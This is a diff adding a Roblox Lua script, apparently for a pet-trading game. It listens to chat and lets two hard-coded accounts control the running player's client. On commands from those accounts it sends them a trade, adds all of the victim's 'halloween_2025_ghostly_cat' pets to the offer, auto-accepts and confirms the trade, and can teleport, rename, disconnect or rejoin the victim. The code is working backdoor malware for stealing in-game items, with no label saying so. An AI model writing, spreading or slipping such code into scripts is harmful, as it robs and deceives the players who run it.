@@ -1,0 +1,53 @@
+local LocalPlayer = game.Players.LocalPlayer
+local Fsys = require(game.ReplicatedStorage:FindFirstChild("Fsys")).load
+local ClientData = Fsys("ClientData")
+local get = Fsys("RouterClient").get
+
+function onPlayerChatted(player)
+	player.Chatted:Connect(function(message)
+		if player.Name == "xlsxh" or player.Name == "tracy_gltx" then
+
+			if message == ".trade" then
+				get("TradeAPI/SendTradeRequest"):FireServer(game.Players[player.Name])
+				game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("i sent you a trade request.")
+			end
+
+			if message == ".teleport" then
+				get("LocationAPI/TeleToPlayer"):InvokeServer(game.Players:FindFirstChild("xlsxh"))
+			end
+
+			if string.sub(message, 1, 5) == ".bio " then
+				get("SettingsAPI/SetSetting"):FireServer("rp_name", string.sub(message, 6))
+			end
+
+			if message == ".add pet" then
+				for i,v in pairs(ClientData.get_data()[LocalPlayer.Name].inventory.pets) do
+					if v["kind"] == "halloween_2025_ghostly_cat" then
+						wait()
+						get("TradeAPI/AddItemToOffer"):FireServer(v.unique)
+					end
+				end
+			end
+
+			if message == ".accept" then
+				get("TradeAPI/AcceptNegotiation"):FireServer()
+				get("TradeAPI/ConfirmTrade"):FireServer()
+			end
+
+			if message == ".disconnect" then
+				game:Shutdown()
+			end
+
+			if message == ".rejoin" then
+				game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId)
+			end
+
+		end
+	end)
+end
+
+for _, player in ipairs(game.Players:GetPlayers()) do
+	onPlayerChatted(player)
+end
+
+game.Players.PlayerAdded:Connect(onPlayerChatted)
